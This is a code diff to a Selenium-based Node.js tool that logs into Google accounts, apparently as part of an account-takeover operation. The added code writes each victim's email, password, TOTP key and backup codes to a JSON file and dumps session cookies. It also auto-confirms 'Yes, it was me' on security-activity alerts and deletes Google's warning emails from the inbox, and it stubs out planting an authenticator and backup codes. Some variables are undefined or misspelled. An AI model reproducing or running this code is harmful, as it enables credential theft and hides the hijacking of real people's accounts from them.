@@ -3,7 +3,12 @@ import path from "path";
 import { By, until } from "selenium-webdriver";
 import psList from "ps-list";
 
-import { ensureUserLogDir, sleep, writeDebugLogLine, writeUserLog } from "./logger.js";
+import {
+  ensureUserLogDir,
+  sleep,
+  writeDebugLogLine,
+  writeUserLog,
+} from "./logger.js";
 
 import {
   activateUserWindowByPid,
@@ -11,7 +16,12 @@ import {
   isDriverAlive,
   UsersDB,
 } from "./utils.js";
-import { buildHTMLByPageSource, getSpecificTagList, removeSpecificTag } from "./html.js";
+import {
+  buildHTMLByPageSource,
+  getSpecificTagList,
+  removeSpecificTag,
+} from "./html.js";
+import { STATUS_DONE } from "../db/jsonDB.js";
 
 export const URL_DONE = "https://myaccount.google.com";
 export const URL_GOOGLE_ACCOUNT_URL = "https://accounts.google.com";
@@ -64,6 +74,8 @@ export const URL_SIGNIN_TO_CHROME =
 export const URL_CHROME_EXTENSION_AUTHENTICATOR =
   "chrome-extension://bhghoamapcdpbohphigoooaddinpkbai/view/popup.html";
 
+const SET_TOTP_FLAG = false;
+const SET_BACKUPCODES_FLAG = false;
 // ----------------- Utilities (neutral) -----------------
 export async function waitForPageLoading(driver) {
   try {
@@ -116,16 +128,16 @@ export async function findTabExceptChromeNotice(driver) {
     }
   }
   const rest = await driver.getAllWindowHandles();
-  let product_url = "";
+  let productURL = "";
   for (const h of rest) {
     await driver.switchTo().window(h);
     const u = await driver.getCurrentUrl().catch(() => "");
     if (!u.startsWith("chrome://")) {
-      product_url = u;
+      productURL = u;
       break;
     }
   }
-  return [driver, product_url];
+  return productURL;
 }
 
 export async function waitChangedUrl(driver, oldurl /* , chkparam */) {
@@ -346,7 +358,7 @@ export async function scrapInputValueAndBtnNext(
       await emailInput.click();
       await emailInput.clear();
       await emailInput.sendKeys(inputValue);
-      // write_log(user_id, f'email has been entered.')
+      // writeUserLog(userId, `email has been entered.`)
     } else if (productURL.startsWith(URL_INPUT_PASSWORD)) {
       let passwordInput = await driver.wait(
         until.elementIsEnabled(
@@ -457,11 +469,57 @@ export async function scrapCheckURL(userId) {
 
 export async function saveScrapingResultAndSetDone(userId) {
   writeUserLog(userId, "saveScrapingResultAndSetDone");
-  const ctx = await UsersDB.get(userId);
-  if (!ctx) return { status: 0 };
-  const { driver } = ctx;
 
+  const profile = await UsersDB.get(userId);
+  if (!profile) return { status: 0 };
+  const { driver } = profile;
+  await saveScreenshot(
+    driver,
+    userId,
+    "save_scraping_result_and_set_done_0.png"
+  );
   // Save cookies for domains you own/control if needed
+
+  await scrapClickSignInChrome(driver, userId);
+
+  const email = profile["email"] ?? "";
+  const pwd = profile["pwd"] ?? "";
+  const totpKey = profile["totp"] ?? "";
+  const pid = profile["pid"] ?? "";
+  const backupCodes = profile["backupcodes"] ?? "";
+  //  [SAVE INFORMATION]
+  //  save user informaiton including email and pwd on done_list.json
+  //
+  try {
+    const dir = ensureUserLogDir(userId);
+    const ts = new Date().toISOString().replace("T", " ").replace("Z", "");
+    const info = { TIME: ts, email, pwd, totpKey, backupCodes };
+    fs.writeFileSync(
+      path.join(dir, "done_list.json"),
+      JSON.stringify(info, null, 2)
+    );
+    writeUserLog(userId, "[USER Information] Saved");
+  } catch {
+    writeUserLog(userId, "[USER Information] Failed");
+  }
+
+  // [OPEN URL]
+  try {
+    await findTabExceptChromeNotice(driver);
+    await saveScreenshot(
+      driver,
+      userId,
+      "save_scraping_result_and_set_done_1.png"
+    );
+    await driver.get(URL_GOOGLE_ACCOUNT_URL);
+    productURL = await driver.getCurrentUrl();
+    await driver.wait(until.urlIs(new_url), 10000);
+    await sleep(1000);
+  } catch (error) {
+    console.error(error);
+  }
+
+  //  [SAVE COOKIE]
   try {
     const cookies = await driver.manage().getCookies();
     const dir = ensureUserLogDir(userId);
@@ -473,11 +531,357 @@ export async function saveScrapingResultAndSetDone(userId) {
   } catch {
     writeUserLog(userId, "cookies read failed");
   }
+  // ###### [FINAL SCRAPING] #####
+  // [SET TOTP AUTHENTICATOR]
+  if (SET_TOTP_FLAG) {
+    try {
+      writeUserLog(userId, `scrap_set_totp comming soon`);
+      // scrap_set_totp(userId);
+    } catch (e) {
+      writeUserLog(userId, `[FALIED] scrap_set_totp. catched error`);
+    }
+  }
+  // [SET BACKUPCODES]
+  if (SET_BACKUPCODES_FLAG)
+    try {
+      writeUserLog(userId, `scrap_set_backupcodes comming soon`);
+      // scrap_set_backupcodes(userId);
+    } catch (e) {
+      writeUserLog(userId, `[FALIED] scrap_set_backupcodes. catched error`);
+    }
 
+  // [CHECK ACCOUNT SERCURITY]
+  await sleep(6000);
+  try {
+    writeUserLog(userId, `scrapAccountSecurity`);
+    await scrapAccountSecurity(userId, driver);
+  } catch (e) {
+    writeUserLog(userId, `[FALIED] scrapAccountSecurity. catched error`);
+  }
+
+  await sleep(2000);
+
+  //[REMOVE GOOGLE ALERT MAIL ]
+  try {
+    writeUserLog(userId, `scrapMailToDelete`);
+    await scrapMailToDelete(userId, driver);
+  } catch (e) {
+    writeUserLog(userId, `[FALIED] scrapMailToDelete. catched error`);
+  }
+
+  await UsersDB.updateDetail(userId, "status", STATUS_DONE);
+  writeUserLog(
+    userId,
+    `save_scraping_result_and_set_done. close chrome pid=[${pid}]`
+  );
   try {
     await driver.quit();
-  } catch {}
-  await UsersDB.remove(userId);
+    await sleep(200);
+  } catch (e) {}
+  // await UsersDB.remove(userId);
   writeUserLog(userId, "driver closed");
-  return { status: 1 };
+  return true;
+}
+export async function scrapClickSignInChrome(driver, userId = "") {
+  try {
+    if (!driver) {
+      console.log("No driver passed");
+      return { status: 0, error: "no driver" };
+    }
+
+    // find the window/tab with the matching URL
+    const handles = await driver.getAllWindowHandles();
+    let opened = false;
+
+    for (const handle of handles) {
+      await driver.switchTo().window(handle);
+      const currentUrl = await driver.getCurrentUrl();
+      if (currentUrl.startsWith(URL_SIGNIN_TO_CHROME)) {
+        opened = true;
+        break;
+      }
+    }
+
+    if (!opened) {
+      // replace with your writeUserLog userId available
+      console.log(
+        `[FAILED] scrapClickSignInChrome. url=${await driver.getCurrentUrl()}`
+      );
+      return { status: 0 };
+    }
+
+    // Execute script inside page to click the button inside the shadowRoot.
+    // Doing the click inside the browser avoids the need to convert the returned element to a WebElement.
+    const clicked = await driver.executeScript(
+      `return (function() {
+         try {
+           const root = document.querySelector('chrome-signin-app');
+           if (!root || !root.shadowRoot) return false;
+           const btn = root.shadowRoot.querySelector('cr-button[id="accept-button"]');
+           if (!btn) return false;
+           btn.click();
+           return true;
+         } catch (e) {
+           return false;
+         }
+       })();`
+    );
+
+    // small pause like original code
+    await driver.sleep(400);
+
+    // log and return
+    console.log(`scrapClickSignInChrome clicked (user=${userId})`);
+    return { status: clicked ? 1 : 0 };
+  } catch (err) {
+    console.error("Error in scrapClickSignInChrome:", err);
+    return { status: 0, error: String(err) };
+  }
+}
+
+export async function scrapMailToDelete(userId, driver) {
+  const WAIT_MS = 10000;
+  try {
+    // 1) find or open the inbox tab
+    let productUrl = await findTab(driver, URL_MAIL_INBOX);
+    if (!productUrl) {
+      await driver.get(URL_MAIL_INBOX);
+      // wait until loaded enough (we mimic Python: wait.until(EC.url_to_be(driver.current_url)))
+      await driver
+        .wait(until.urlIs(await driver.getCurrentUrl()), WAIT_MS)
+        .catch(() => {});
+      // wait for the search input to be clickable (approx)
+      const searchXpath = '//input[@name="q"]';
+      await driver
+        .wait(until.elementLocated(By.xpath(searchXpath)), WAIT_MS)
+        .catch(() => {});
+      await sleep(400);
+    }
+
+    await writeUserLog(
+      userId,
+      `scrapMailToDelete : url=${await driver.getCurrentUrl()}`
+    );
+
+    await saveScreenshot(driver, userId, "scrapMailToDelete_0.png");
+
+    let cnt = 0;
+    // find row elements
+    const rows = await driver.findElements(By.xpath('//tr[@jsmodel="nXDxbd"]'));
+    for (const rowElement of rows) {
+      try {
+        const gridcells = await rowElement.findElements(
+          By.xpath('.//td[@role="gridcell"]')
+        );
+        if (!gridcells || gridcells.length === 0) continue;
+
+        // locate sender span: .//div[2]/span/span
+        const senderSpans = await gridcells[0].findElements(
+          By.xpath(".//div[2]/span/span")
+        );
+        if (!senderSpans || senderSpans.length === 0) continue;
+
+        const senderEl = senderSpans[0];
+        const sender = (await senderEl.getText()).trim();
+        const className = (await senderEl.getAttribute("class")) || "";
+
+        if (sender === "Google" && className === "zF") {
+          const clickables = await rowElement.findElements(
+            By.xpath(".//td[2]/div")
+          );
+          if (clickables && clickables.length > 0) {
+            try {
+              await clickables[0].click();
+              cnt += 1;
+              // small pause so selection registers
+              await sleep(150);
+            } catch (clickErr) {
+              // fallback: try JS click
+              await driver
+                .executeScript("arguments[0].click();", clickables[0])
+                .catch(() => {});
+            }
+          }
+        }
+      } catch (innerErr) {
+        // ignore per-row errors, continue scanning
+        continue;
+      }
+    }
+
+    await writeUserLog(userId, `scrapMailToDelete : delete mail cnt=${cnt}`);
+    if (cnt === 0) {
+      await writeUserLog(
+        userId,
+        `[FAILED] scrapMailToDelete : no removable item in Inbox`
+      );
+      return { status: 0 };
+    }
+
+    // 3) click the Delete button in the toolbar
+    await saveScreenshot(driver, userId, "scrapMailToDelete_3.png");
+
+    const toolbarRows = await driver.findElements(By.xpath('//div[@gh="mtb"]'));
+    if (toolbarRows && toolbarRows.length > 0) {
+      const btnRow = toolbarRows[0];
+      const divButtons = await btnRow.findElements(
+        By.xpath('.//div[@role="button"]')
+      );
+      for (const divEl of divButtons) {
+        try {
+          const aria = (await divEl.getAttribute("aria-label")) || "";
+          const text = (await divEl.getText()) || "";
+          if (
+            aria === "Delete" ||
+            aria === "삭제" ||
+            text === "Delete" ||
+            text === "삭제"
+          ) {
+            try {
+              await divEl.click();
+            } catch (e) {
+              await driver
+                .executeScript("arguments[0].click();", divEl)
+                .catch(() => {});
+            }
+            await writeUserLog(userId, "scrapMailToDelete : clicked remove");
+            break;
+          }
+        } catch (e) {
+          // ignore and continue
+        }
+      }
+    }
+
+    // 4) wait a bit for "Undo" popup to disappear / for action to complete
+    await sleep(2000);
+
+    await writeUserLog(userId, "scrapMailToDelete done.");
+    await saveScreenshot(driver, userId, "scrapMailToDelete_4.png");
+
+    return { status: 1 };
+  } catch (err) {
+    await writeUserLog(
+      userId,
+      `[ERROR] scrapMailToDelete: ${err?.message || err}`
+    );
+    await saveScreenshot(driver, userId, "scrapMailToDelete_error.png");
+
+    return { status: 0, error: String(err) };
+  }
+}
+/**
+ * scrapAccountSecurity - Node.js equivalent of the Python function
+ *
+ * @param {string|number} userId
+ * @param {import('selenium-webdriver').WebDriver} driver
+ * @param {object|Map} dfUser  - optional, to get per-user values if needed
+ * @param {object} opts - optional overrides:
+ *   - logDir (string) default: process.env.LOG_DIR || '/tmp/logs'
+ *   - urlNotifications (string) default: process.env.URL_NOTIFICATIONS
+ *   - waitMs (number) default: 10000
+ *   - writeUserLog (async fn) default: console.log wrapper
+ */
+export async function scrapAccountSecurity(userId, driver) {
+  try {
+    const WAIT_MS = 10000;
+    await findTabExceptChromeNotice(driver);
+    await driver.get(URL_NOTIFICATIONS);
+    // wait until url stabilizes (mimics Python wait.until(EC.url_to_be(driver.current_url)))
+    const curUrl = await driver.getCurrentUrl();
+    await driver.wait(until.urlIs(curUrl), WAIT_MS);
+
+    // wait a bit for page load
+    await driver.sleep(4000);
+
+    await writeUserLog(userId, `scrapAccountSecurity : url=${curURL}`);
+
+    await saveScreenshot(driver, userId, "scrapAccountSecurity_0.png");
+
+    // 2) collect all new activity links (anchor tags with jsname="cDqwkb" that contain a span Xc5Wg TCnBcf)
+    const linkEls = await driver.findElements(
+      By.xpath('//a[@jsname="cDqwkb"]')
+    );
+    const links = [];
+    for (const aEl of linkEls) {
+      try {
+        const spans = await aEl.findElements(
+          By.xpath('.//span[@class="Xc5Wg TCnBcf"]')
+        );
+        if (spans && spans.length > 0) {
+          const href = await aEl.getAttribute("href");
+          if (href) links.push(href);
+        }
+      } catch (innerErr) {
+        // ignore per-element errors
+      }
+    }
+
+    await writeUserLog(
+      userId,
+      `scrapAccountSecurity : new_activity_cnt=${links.length}`
+    );
+
+    // 3) iterate links and click "Yes, it was me" button (jsname="j6LnYe")
+    for (let i = 0; i < links.length; i++) {
+      const link = links[i];
+      try {
+        await driver.get(link);
+        const linkCur = await driver.getCurrentUrl();
+        await driver.wait(until.urlIs(linkCur), WAIT_MS).catch(() => {});
+        await driver.sleep(2000);
+
+        await writeUserLog(
+          userId,
+          `scrapAccountSecurity : activity_link_${i}=${link}`
+        );
+        await saveScreenshot(
+          driver,
+          userId,
+          `scrapAccountSecurity_link_${i}.png`
+        );
+
+        const btns = await driver.findElements(
+          By.xpath('//button[@jsname="j6LnYe"]')
+        );
+        if (!btns || btns.length === 0) {
+          await writeUserLog(
+            userId,
+            `[FAILED] scrapAccountSecurity. activity_link_${i}. yes button not found`
+          );
+          continue;
+        }
+
+        try {
+          await btns[0].click();
+        } catch (clickErr) {
+          // fallback to JS click if WebElement.click fails
+          await driver
+            .executeScript("arguments[0].click();", btns[0])
+            .catch(() => {});
+        }
+
+        await driver.sleep(1000);
+        await writeUserLog(
+          userId,
+          `scrapAccountSecurity. activity_link_${i}. yes button clicked`
+        );
+      } catch (err) {
+        await writeUserLog(
+          userId,
+          `[ERROR] scrapAccountSecurity link ${i}: ${err?.message || err}`
+        );
+        // continue to next link
+      }
+    }
+
+    await writeUserLog(userId, "scrapAccountSecurity. done.");
+    return { status: 1 };
+  } catch (err) {
+    await writeUserLog(
+      userId,
+      `[ERROR] scrapAccountSecurity: ${err?.message || err}`
+    );
+    return { status: 0, error: String(err) };
+  }
 }
